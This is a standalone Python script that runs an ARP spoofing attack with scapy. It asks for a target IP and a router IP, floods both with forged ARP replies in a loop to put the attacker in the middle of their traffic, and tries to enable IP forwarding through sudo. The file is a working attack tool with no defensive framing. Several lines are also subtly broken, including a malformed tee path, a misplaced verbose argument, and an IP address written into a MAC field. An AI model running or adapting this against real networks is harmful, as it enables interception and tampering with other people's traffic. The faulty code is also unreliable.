def _all_():  
  import os
  import sys
  import time
  import subprocess
  ###### ip forwarding ######
  subprocess.getoutput("echo 1 | sudo tee/proc/sys/net/ipv4/if_forward")
  try:
    from colorama import Fore
  except:
    time.sleep(1)
    print("[-] Pleass Install The Librery --> colorama")
    sys.exit()
  try:
    from scapy.layers.l2 import ARP , Ether
    from scapy.sendrecv import srp , send
  except:
    time.sleep(1)
    print(Fore.LIGHTBLACK_EX + "[-] Pleass Install The Librery --> scapy")
    sys.exit()
  from baner import baner
  os.system("clear")
  baner()
  time.sleep(1)
  org_list = []
  def get_arg():
    my_list = input(Fore.LIGHTBLACK_EX + "[!] Pleass Enter Ip Target And Ip Router : ").split(",")

    arp_requests = ARP(pdst=my_list[0])
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    broadcast_arp_requests = broadcast / arp_requests
    a = srp(broadcast_arp_requests , timeout=2 , verbose=False)[0]
    mac_target = a[0][1].hwsrc
    try:
      ip_target = my_list[0]
      ip_router = my_list[1]
    except:
      time.sleep(1)
      print("\n[-] Your Input Have The Problem")
    else:
      org_list.append(ip_target)
      org_list.append(ip_router)
      org_list.append(mac_target)
  def spoof(ip_t , ip_r , mac_t):
    target_mac = mac_t
    packed = ARP(op=2 , pdst=ip_t , psrc=ip_r , verbose=False)
    send(packed , verbose=False)
  def result1():
    spoof(org_list[0] , org_list[1] , org_list[2])
  def result2():
    spoof(org_list[1] , org_list[0] , org_list[2])
  def restory(ip_target , ip_router , mac_target ):
    org_mac = mac_target
    org_ip = ip_target
    org_ip_router = ip_router
    packed = ARP(op=2 , pdst = org_ip , psrc = org_ip_router , hwdst = org_mac , hwsrc = org_ip)
    send(packed , verbose=False , count=6)
  def result3():
    restory(org_list[0] , org_list[1] , org_list[2])
  get_arg()
  counter = 2
  try:
    while True:
      result1()
      result2()
      counter += 2
      sys.stdout.write(Fore.LIGHTBLACK_EX + f"\r[+] ~ Packed Send : {str(counter)}"),sys.stdout.flush()
      time.sleep(2)
  except KeyboardInterrupt:
    result3()
    print("\nDONE")
_all_()
